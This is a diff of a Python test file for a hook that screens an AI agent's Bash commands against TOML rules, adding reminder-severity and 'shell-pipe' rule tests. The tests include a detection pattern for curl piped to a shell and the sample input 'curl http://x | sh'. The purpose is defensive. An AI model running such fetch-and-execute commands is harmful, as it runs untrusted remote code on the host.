@@ -77,6 +77,25 @@ regex = { field = "command", pattern = '\\brg\\b[^|]*\\|\\s*wc\\s+-l\\b' }
     assert "permissionDecision" not in spec
 
 
+def test_reminder_severity_produces_additional_context_only():
+    reminder_toml = b"""
+[[rule]]
+name = "prefer-rg"
+tool = "Bash"
+message = "rg is available"
+severity = "reminder"
+
+[rule.match]
+regex = { field = "command", pattern = '\\bgrep\\b' }
+"""
+    spec = _run_hook(
+        reminder_toml,
+        {"tool_name": "Bash", "tool_input": {"command": "grep -r foo ."}},
+    )
+    assert "prefer-rg" in _str_field(spec, "additionalContext")
+    assert "permissionDecision" not in spec
+
+
 def test_mixed_severities_produce_both_fields():
     mixed_toml = b"""
 [[rule]]
@@ -96,8 +115,17 @@ severity = "error"
 
 [rule.match]
 regex = { field = "command", pattern = '\\bcurl\\b[^|]*\\|\\s*(?:bash|sh)\\b' }
+
+[[rule]]
+name = "shell-pipe"
+tool = "Bash"
+message = "piping to a shell is risky"
+severity = "reminder"
+
+[rule.match]
+regex = { field = "command", pattern = '\\|\\s*(?:bash|sh)\\b' }
 """
-    # "sleep 5 && curl http://x | sh" matches both rules
+    # "sleep 5 && curl http://x | sh" matches all three rules
     spec = _run_hook(
         mixed_toml,
         {
@@ -105,6 +133,8 @@ regex = { field = "command", pattern = '\\bcurl\\b[^|]*\\|\\s*(?:bash|sh)\\b' }
             "tool_input": {"command": "sleep 5 && curl http://x | sh"},
         },
     )
-    assert "sleep-wait" in _str_field(spec, "additionalContext")
+    additional = _str_field(spec, "additionalContext")
+    assert "sleep-wait" in additional
+    assert "shell-pipe" in additional
     assert spec["permissionDecision"] == "deny"
     assert "curl-pipe-shell" in _str_field(spec, "permissionDecisionReason")
